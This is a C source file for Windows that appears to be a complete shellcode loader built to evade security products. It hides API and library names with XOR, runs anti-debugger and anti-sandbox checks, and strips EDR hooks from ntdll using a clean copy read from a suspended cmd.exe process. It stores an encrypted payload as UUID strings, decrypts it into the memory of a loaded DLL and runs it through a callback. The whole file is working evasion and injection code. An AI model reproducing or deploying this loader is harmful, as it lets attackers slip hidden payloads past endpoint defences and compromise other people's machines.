
#include <Windows.h>
#include <TlHelp32.h>
#include <Rpc.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <tchar.h>

#pragma comment (lib, "Rpcrt4.lib")

#define GETIMAGESIZE(x) (x->pNtHdr->OptionalHeader.SizeOfImage)
#define GETMODULEBASE(x) ((PVOID)x->pDosHdr)
#define STARTSWITHA(x1, x2) ((strlen(x2) > strlen(x1)) ? FALSE : ((BOOL)RtlEqualMemory(x1, x2, strlen(x2))))
#define ENDSWITHW(x1, x2) ((wcslen(x2) > wcslen(x1)) ? FALSE : ((BOOL)RtlEqualMemory(x1 + wcslen(x1) - wcslen(x2), x2, wcslen(x2))))

#if defined(_WIN64)
#define SYSCALLSIZE 0x20
#else
#define SYSCALLSIZE 0x10
#endif

#define KEY 0xe6
#define KEYSIZE sizeof(decKey) - 1
#define SHELLSIZE 0x110


typedef struct
{
    PIMAGE_DOS_HEADER pDosHdr;
    PIMAGE_NT_HEADERS pNtHdr;
    PIMAGE_EXPORT_DIRECTORY pExpDir;
    PIMAGE_SECTION_HEADER pTextSection;
} IMAGE, *PIMAGE;


/* PEB structures redefintion */
typedef struct _UNICODE_STR
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR pBuffer;
} UNICODE_STR, *PUNICODE_STR;

typedef struct _PEB_LDR_DATA
{
    DWORD dwLength;
    DWORD dwInitialized;
    LPVOID lpSsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    LPVOID lpEntryInProgress;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STR FullDllName;
    UNICODE_STR BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashTableEntry;
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_FREE_BLOCK
{
    struct _PEB_FREE_BLOCK *pNext;
    DWORD dwSize;
} PEB_FREE_BLOCK, *PPEB_FREE_BLOCK;

typedef struct __PEB
{
    BYTE bInheritedAddressSpace;
    BYTE bReadImageFileExecOptions;
    BYTE bBeingDebugged;
    BYTE bSpareBool;
    LPVOID lpMutant;
    LPVOID lpImageBaseAddress;
    PPEB_LDR_DATA pLdr;
    LPVOID lpProcessParameters;
    LPVOID lpSubSystemData;
    LPVOID lpProcessHeap;
    PRTL_CRITICAL_SECTION pFastPebLock;
    LPVOID lpFastPebLockRoutine;
    LPVOID lpFastPebUnlockRoutine;
    DWORD dwEnvironmentUpdateCount;
    LPVOID lpKernelCallbackTable;
    DWORD dwSystemReserved;
    DWORD dwAtlThunkSListPtr32;
    PPEB_FREE_BLOCK pFreeList;
    DWORD dwTlsExpansionCounter;
    LPVOID lpTlsBitmap;
    DWORD dwTlsBitmapBits[2];
    LPVOID lpReadOnlySharedMemoryBase;
    LPVOID lpReadOnlySharedMemoryHeap;
    LPVOID lpReadOnlyStaticServerData;
    LPVOID lpAnsiCodePageData;
    LPVOID lpOemCodePageData;
    LPVOID lpUnicodeCaseTableData;
    DWORD dwNumberOfProcessors;
    DWORD dwNtGlobalFlag;
    LARGE_INTEGER liCriticalSectionTimeout;
    DWORD dwHeapSegmentReserve;
    DWORD dwHeapSegmentCommit;
    DWORD dwHeapDeCommitTotalFreeThreshold;
    DWORD dwHeapDeCommitFreeBlockThreshold;
    DWORD dwNumberOfHeaps;
    DWORD dwMaximumNumberOfHeaps;
    LPVOID lpProcessHeaps;
    LPVOID lpGdiSharedHandleTable;
    LPVOID lpProcessStarterHelper;
    DWORD dwGdiDCAttributeList;
    LPVOID lpLoaderLock;
    DWORD dwOSMajorVersion;
    DWORD dwOSMinorVersion;
    WORD wOSBuildNumber;
    WORD wOSCSDVersion;
    DWORD dwOSPlatformId;
    DWORD dwImageSubsystem;
    DWORD dwImageSubsystemMajorVersion;
    DWORD dwImageSubsystemMinorVersion;
    DWORD dwImageProcessAffinityMask;
    DWORD dwGdiHandleBuffer[34];
    LPVOID lpPostProcessInitRoutine;
    LPVOID lpTlsExpansionBitmap;
    DWORD dwTlsExpansionBitmapBits[32];
    DWORD dwSessionId;
    ULARGE_INTEGER liAppCompatFlags;
    ULARGE_INTEGER liAppCompatFlagsUser;
    LPVOID lppShimData;
    LPVOID lpAppCompatInfo;
    UNICODE_STR usCSDVersion;
    LPVOID lpActivationContextData;
    LPVOID lpProcessAssemblyStorageMap;
    LPVOID lpSystemDefaultActivationContextData;
    LPVOID lpSystemAssemblyStorageMap;
    DWORD dwMinimumStackCommit;
} _PEB, *_PPEB;


typedef HANDLE(WINAPI *CreateFileAFunc)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI *CreateProcessAFunc)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL(WINAPI *ReadProcessMemoryFunc)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T *);
typedef BOOL(WINAPI *TerminateProcessFunc)(HANDLE, UINT);
typedef LPVOID(WINAPI *VirtualAllocFunc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef LPVOID(WINAPI *VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);


DWORD g_dwNumberOfHooked = 0;

char cLib1Name[] = { 0x8d, 0x83, 0x94, 0x88, 0x83, 0x8a, 0xd5, 0xd4, 0xc8, 0x82, 0x8a, 0x8a, 0x0 };
char cLib2Name[] = { 0x8b, 0x95, 0x8e, 0x92, 0x8b, 0x8a, 0xc8, 0x82, 0x8a, 0x8a, 0x0 };
char cCreateFileA[] = { 0xa5, 0x94, 0x83, 0x87, 0x92, 0x83, 0xa0, 0x8f, 0x8a, 0x83, 0xa7, 0x0 };
char cCreateProcessA[] = { 0xa5, 0x94, 0x83, 0x87, 0x92, 0x83, 0xb6, 0x94, 0x89, 0x85, 0x83, 0x95, 0x95, 0xa7, 0x0 };
char cReadProcessMemory[] = { 0xb4, 0x83, 0x87, 0x82, 0xb6, 0x94, 0x89, 0x85, 0x83, 0x95, 0x95, 0xab, 0x83, 0x8b, 0x89, 0x94, 0x9f, 0x0 };
char cTerminateProcess[] = { 0xb2, 0x83, 0x94, 0x8b, 0x8f, 0x88, 0x87, 0x92, 0x83, 0xb6, 0x94, 0x89, 0x85, 0x83, 0x95, 0x95, 0x0 };
char cVirtualAlloc[] = { 0xb0, 0x8f, 0x94, 0x92, 0x93, 0x87, 0x8a, 0xa7, 0x8a, 0x8a, 0x89, 0x85, 0x0 };
char cVirtualProtect[] = { 0xb0, 0x8f, 0x94, 0x92, 0x93, 0x87, 0x8a, 0xb6, 0x94, 0x89, 0x92, 0x83, 0x85, 0x92, 0x0 };

char decKey[] = { 0xbf, 0x89, 0x93, 0xc6, 0x87, 0x94, 0x83, 0xc6, 0x87, 0x88, 0xc6, 0x83, 0x8a, 0x8f, 0x92, 0x83, 0xc6, 0x8e, 0x87, 0x85, 0x8d, 0x83, 0x94, 0xc7, 0x0 };

const char *uuids[] = {
        "c4f627a5-9a91-20a5-616e-61342d392634",
        "b1502076-2d0e-73f9-3927-fe72793aee72",
        "17ab2641-213c-d27b-6a22-2c52a22d43e1",
        "5c1453f5-5e63-6145-a0a7-2d246da89688",
        "2b302972-37e0-aa52-1b53-3d21b1f9e5a8",
        "2d206e61-a9e9-0200-6869-b133e02d6a65",
        "69552fd2-a260-7686-2991-e924e75dfc2d",
        "522cbe21-2da2-e143-f52e-b4e96c3364e1",
        "94558e59-6a20-4138-282d-58b21ebd2a65",
        "69512fd2-a260-6103-ea62-6821e729682c",
        "e820b821-ed6f-203a-892e-2d61392c3c7a",
        "3c613620-332d-e63c-cc48-203194852a60",
        "ab3d3500-9b73-df32-9e91-7d2dd6687465",
        "63616820-2d6b-acff-586e-752020c854ab",
        "b0dfe90e-99d7-c7c1-7629-dbc5fed8efde",
        "e4f6278c-4e49-5c63-6bee-db85196ccf22",
        "090e1a33-3c6b-a833-8390-a043001e0620"
};

unsigned char *pShell; 


CreateFileAFunc pCreateFileAFunc;
CreateProcessAFunc pCreateProcessAFunc;
ReadProcessMemoryFunc pReadProcessMemoryFunc;
TerminateProcessFunc pTerminateProcessFunc;
VirtualAllocFunc pVirtualAllocFunc;
VirtualProtectFunc pVirtualProtectFunc;


_PPEB GetPEB()
{
    
#if defined(_WIN64)
   
    return (_PPEB)__readgsqword(0x60);
#else
    
    return (_PPEB)__readfsdword(0x30);
#endif
}

PVOID FindNtDLL(_PPEB pPEB)
{
    
    PVOID pDllBase = NULL;

    
    PPEB_LDR_DATA pLdr = pPEB->pLdr;
    PLDR_DATA_TABLE_ENTRY pLdrData;
    PLIST_ENTRY pEntryList = &pLdr->InMemoryOrderModuleList;
    
    
    for (PLIST_ENTRY pEntry = pEntryList->Flink; pEntry != pEntryList; pEntry = pEntry->Flink)
    {
        pLdrData = (PLDR_DATA_TABLE_ENTRY)pEntry;

        
        if (ENDSWITHW(pLdrData->FullDllName.pBuffer, L"ntdll.dll"))
        {
            pDllBase = (PVOID)pLdrData->DllBase;
            break;
        }

    }
    
    return pDllBase;
}


PIMAGE ParseImage(PBYTE pImg)
{
    
    PIMAGE pParseImg;

    
    if (!(pParseImg = (PIMAGE) malloc(sizeof(IMAGE))))
    {
        return NULL;
    }

    
    pParseImg->pDosHdr = (PIMAGE_DOS_HEADER)pImg;

    
    if (pParseImg->pDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
    {
        

        free(pParseImg);
        return NULL;
    }

    
    pParseImg->pNtHdr = (PIMAGE_NT_HEADERS)((DWORD_PTR)pImg + pParseImg->pDosHdr->e_lfanew);
	
    
    if (pParseImg->pNtHdr->Signature != IMAGE_NT_SIGNATURE)
    {
        free(pParseImg);
        return NULL;
    }
	
    
    pParseImg->pExpDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)pImg + pParseImg->pNtHdr->OptionalHeader.DataDirectory[0].VirtualAddress);
	
    
    pParseImg->pTextSection = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pParseImg->pNtHdr);
	
    return pParseImg;
}

PVOID GetFreshCopy(PIMAGE pHookedImg)
{
    

    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOA si = { 0 };
    PVOID pDllBase;
    SIZE_T nModuleSize, nBytesRead = 0;

    if (
        !pCreateProcessAFunc(
        NULL, 
        (LPSTR)"cmd.exe", 
        NULL, 
        NULL, 
        FALSE, 
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE, 
        NULL, 
        (LPCSTR)"C:\\Windows\\System32\\", 
        &si, 
        &pi)
    )
        return NULL;

    nModuleSize = GETIMAGESIZE(pHookedImg);

    
    if (!(pDllBase = (PVOID)pVirtualAllocFunc(NULL, nModuleSize, MEM_COMMIT, PAGE_READWRITE)))
        return NULL;

    
    if (!pReadProcessMemoryFunc(pi.hProcess, (LPCVOID)GETMODULEBASE(pHookedImg), pDllBase, nModuleSize, &nBytesRead))
        return NULL;

    
    pTerminateProcessFunc(pi.hProcess, 0);

    return pDllBase;
}

PVOID FindEntry(PIMAGE pFreshImg, PCHAR cFunctionName) {
    
    PDWORD pdwAddrOfFunctions = (PDWORD)((PBYTE)GETMODULEBASE(pFreshImg) + pFreshImg->pExpDir->AddressOfFunctions);
    PDWORD pdwAddrOfNames = (PDWORD)((PBYTE)GETMODULEBASE(pFreshImg) + pFreshImg->pExpDir->AddressOfNames);
    PWORD pwAddrOfNameOrdinales = (PWORD)((PBYTE)GETMODULEBASE(pFreshImg) + pFreshImg->pExpDir->AddressOfNameOrdinals);

    for (WORD idx = 0; idx < pFreshImg->pExpDir->NumberOfNames; idx++) {
        PCHAR cFuncName = (PCHAR)GETMODULEBASE(pFreshImg) + pdwAddrOfNames[idx];
        PBYTE pFuncAddr = (PBYTE)GETMODULEBASE(pFreshImg) + pdwAddrOfFunctions[pwAddrOfNameOrdinales[idx]];

        if (strcmp(cFuncName, cFunctionName) == 0)
        {
#if defined(_WIN64)
            WORD wCtr = 0;

            while(TRUE)
            {
                
                if (RtlEqualMemory(pFuncAddr + wCtr, "\x0f\x05", 2))
                    break;
            
                
                if (*(pFuncAddr + wCtr) == 0xc3)
                    break;

                
                if (RtlEqualMemory(pFuncAddr + wCtr, "\x4c\x8b\xd1\xb8", 4) && 
                    RtlEqualMemory(pFuncAddr + wCtr + 6, "\x00\x00", 2)
                )
                {
                    return pFuncAddr;
                }

                wCtr++;
            }
#else
            if (STARTSWITHA(cFuncName, "Nt") || STARTSWITHA(cFuncName, "Zw"))
                return pFuncAddr;
#endif

        }
    }

    return NULL;
}

BOOL IsHooked(PVOID pAPI)
{
    
    if (*((PBYTE)pAPI) == 0xe9)
    {
        g_dwNumberOfHooked++;
        return TRUE;
    }

    return FALSE;
}

BOOL RemoveHooks(PIMAGE pHookedImg, PIMAGE pFreshImg)
{
    PCHAR cFuncName;
    PBYTE pFuncAddr;
    PVOID pFreshFuncAddr;
    DWORD dwOldProtect = 0;

    
    PDWORD pdwAddrOfFunctions = (PDWORD)((PBYTE)GETMODULEBASE(pHookedImg) + pHookedImg->pExpDir->AddressOfFunctions);
    PDWORD pdwAddrOfNames = (PDWORD)((PBYTE)GETMODULEBASE(pHookedImg) + pHookedImg->pExpDir->AddressOfNames);
    PWORD pwAddrOfNameOrdinales = (PWORD)((PBYTE)GETMODULEBASE(pHookedImg) + pHookedImg->pExpDir->AddressOfNameOrdinals);

    
    if (!pVirtualProtectFunc((LPVOID)((DWORD_PTR)GETMODULEBASE(pHookedImg) + pHookedImg->pTextSection->VirtualAddress), pHookedImg->pTextSection->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &dwOldProtect))
        return FALSE;

    for (WORD idx = 0; idx < pHookedImg->pExpDir->NumberOfNames; idx++)
    {
        cFuncName = (PCHAR)GETMODULEBASE(pHookedImg) + pdwAddrOfNames[idx];
        pFuncAddr = (PBYTE)GETMODULEBASE(pHookedImg) + pdwAddrOfFunctions[pwAddrOfNameOrdinales[idx]];

       
        if (STARTSWITHA(cFuncName, "Nt") || STARTSWITHA(cFuncName, "Zw"))
        {
#if defined(_WIN64)
            
            if (RtlEqualMemory(cFuncName, "NtQuerySystemTime", 18) || RtlEqualMemory(cFuncName, "ZwQuerySystemTime", 18))
                continue;
#endif

            if (IsHooked(pFuncAddr))
            {
                
                if ((pFreshFuncAddr = FindEntry(pFreshImg, cFuncName)) != NULL)
                   
                    RtlCopyMemory(pFuncAddr, pFreshFuncAddr, SYSCALLSIZE);					
	
            }
        }
    }

    
    if (!pVirtualProtectFunc((LPVOID)((DWORD_PTR)GETMODULEBASE(pHookedImg) + pHookedImg->pTextSection->VirtualAddress), pHookedImg->pTextSection->Misc.VirtualSize, dwOldProtect, &dwOldProtect))
        return FALSE;

	
    return TRUE;
}

BOOL UnHookNtDLL(PVOID pNtDLL)
{
    PVOID pFreshNtDLL;
    PIMAGE pHookedImg, pFreshImg;
    BOOL bRet;

    
    if (!(pHookedImg = ParseImage((PBYTE)pNtDLL)))
        return FALSE;

    
    if (!(pFreshNtDLL = GetFreshCopy(pHookedImg)))
        return FALSE;

    
    if (!(pFreshImg = ParseImage((PBYTE)pFreshNtDLL)))
        return FALSE;

    
    bRet = RemoveHooks(pHookedImg, pFreshImg);

    
    free(pHookedImg);
    free(pFreshImg);

    return bRet;
}


BOOL FindProcById(DWORD dwProcId, PROCESSENTRY32 *pe32)
{

    HANDLE hSnapshot;
    BOOL bSuccess = FALSE;

    if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) != INVALID_HANDLE_VALUE)
    {
        pe32->dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, pe32)) 
        {
            do {
                if (pe32->th32ProcessID == dwProcId)
                {
                    bSuccess = TRUE;
                    break;
                }
            } while (Process32Next(hSnapshot, pe32));
        }

        CloseHandle(hSnapshot);
    } 

    return bSuccess;
}


void deObfuscateData(char *data)
{
    for (int idx = 0; idx < strlen(data); idx++)
    {
        data[idx] = data[idx] ^ KEY;
    }
    
}

void deObfuscateAll()
{
    deObfuscateData(decKey);
    deObfuscateData(cLib1Name);
    deObfuscateData(cLib2Name);
    deObfuscateData(cCreateFileA);
    deObfuscateData(cCreateProcessA);
    deObfuscateData(cReadProcessMemory);
    deObfuscateData(cTerminateProcess);
    deObfuscateData(cVirtualAlloc);
    deObfuscateData(cVirtualProtect);
}

void decShell()
{
    for (int idx = 0, ctr = 0; idx < SHELLSIZE; idx++)
    {
        ctr = (ctr == KEYSIZE) ? 0 : ctr;
        pShell[idx] = pShell[idx] ^ decKey[ctr++];
    }

}

int _tmain(int argc, TCHAR **argv)
{  
    _PPEB pPEB;
    PVOID pNtDLL;
    DWORD_PTR pFuncAddr, pShellReader;
    DWORD dwOldProtect = 0;
    HMODULE hModule, hModule2;
    char *pMem;
    int nMemAlloc, nCtr = 0;
    PROCESSENTRY32 pe32;

    if (FindProcById(GetCurrentProcessId(), &pe32))
    {
        _tprintf(TEXT("Current pid = %d, exename = %s\n"), pe32.th32ProcessID, pe32.szExeFile);
        printf("We found the parent proccess id -> %d\n", pe32.th32ParentProcessID);

        if (FindProcById(pe32.th32ParentProcessID, &pe32))
        {
            _tprintf(TEXT("The parent process is %s\n"), pe32.szExeFile);

            
            if (!(_tcscmp(pe32.szExeFile, TEXT("cmd.exe")) == 0 || _tcscmp(pe32.szExeFile, TEXT("powershell.exe")) == 0))
                return EXIT_FAILURE;
        }
    }

    puts("Deobfuscate all (APIs, Libraries, Decryption key)");
    deObfuscateAll();

    
    if (!(
        (hModule = LoadLibraryA((LPCSTR)cLib1Name)) &&
        (hModule2 = LoadLibraryA((LPCSTR)cLib2Name))
    )) {
        return EXIT_FAILURE;
    }

   
    if (!(
        (pCreateFileAFunc = (CreateFileAFunc) GetProcAddress(hModule, cCreateFileA)) &&
        (pCreateProcessAFunc = (CreateProcessAFunc) GetProcAddress(hModule, cCreateProcessA)) &&
        (pReadProcessMemoryFunc = (ReadProcessMemoryFunc) GetProcAddress(hModule, cReadProcessMemory)) &&
        (pTerminateProcessFunc = (TerminateProcessFunc) GetProcAddress(hModule, cTerminateProcess)) &&
        (pVirtualAllocFunc = (VirtualAllocFunc) GetProcAddress(hModule, cVirtualAlloc)) &&
        (pVirtualProtectFunc = (VirtualProtectFunc) GetProcAddress(hModule, cVirtualProtect))
    )) {
        return EXIT_FAILURE;
    }

    
    if (pCreateFileAFunc(cLib2Name, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL) != INVALID_HANDLE_VALUE)
    {
        return EXIT_FAILURE;
    }

    pPEB = GetPEB();
    
   
    if (pPEB->bBeingDebugged)
    {
        puts("The current process running under debugger");
        return EXIT_FAILURE;
    }

   
    nMemAlloc = KEY << 20;

    
    if (!(pMem = (char *) malloc(nMemAlloc)))
    {
        return EXIT_FAILURE;
    }

    
    for (int idx = 0; idx < nMemAlloc; idx++)
    {
        
        pMem[nCtr++] = 0x00;
    }
    
    
    if (nMemAlloc != nCtr)
    {
        return EXIT_FAILURE;
    }

    
    free(pMem);

    puts("Try to find ntdll.dll base address from PEB, without call GetModuleHandle/LoadLibrary");
    if(!(pNtDLL = FindNtDLL(pPEB)))
    {
        puts("Could not find ntdll.dll");
        return EXIT_FAILURE;
    }

    printf("ntdll base address = %p\n", pNtDLL);

    puts("Try to unhook ntdll");
    if (!UnHookNtDLL(pNtDLL))
    {
        puts("Something goes wrong in UnHooking phase");
        return EXIT_FAILURE;
    }

    if (g_dwNumberOfHooked != 0)
        printf("There were %d hooked syscalls\n", g_dwNumberOfHooked);

    else
        puts("There are no hooked syscalls");

    
    pFuncAddr = (DWORD_PTR) hModule2 + 0x1000;

    
    pShell = (unsigned char *) pFuncAddr;

   
    pShellReader = (DWORD_PTR) pShell;

    printf("Shellcode will be written at %p\n", pShell);

    
    if (pVirtualProtectFunc((LPVOID)pFuncAddr, SHELLSIZE, PAGE_READWRITE, &dwOldProtect) == 0)
    {
        return EXIT_FAILURE;
    }

    puts("Deobfuscate UUIDs, and obtain encrypted shellcode from it");

    for (int idx = 0; idx < sizeof(uuids) / sizeof(PCHAR); idx++)
    {
        if (UuidFromStringA((RPC_CSTR)uuids[idx], (UUID *)pShellReader) == RPC_S_INVALID_STRING_UUID)
        {
            return EXIT_FAILURE;
        }
        
        
        pShellReader += 0x10;
    }

    puts("Decrypt shellcode");
    decShell();
    
    
    if (pVirtualProtectFunc((LPVOID)pFuncAddr, SHELLSIZE, dwOldProtect, &dwOldProtect) == 0)
    {
        return EXIT_FAILURE;
    }

    puts("Inject shellcode, without creating a new thread");

   
    return EnumSystemLocalesA((LOCALE_ENUMPROCA)pFuncAddr, LCID_SUPPORTED) != 0;

}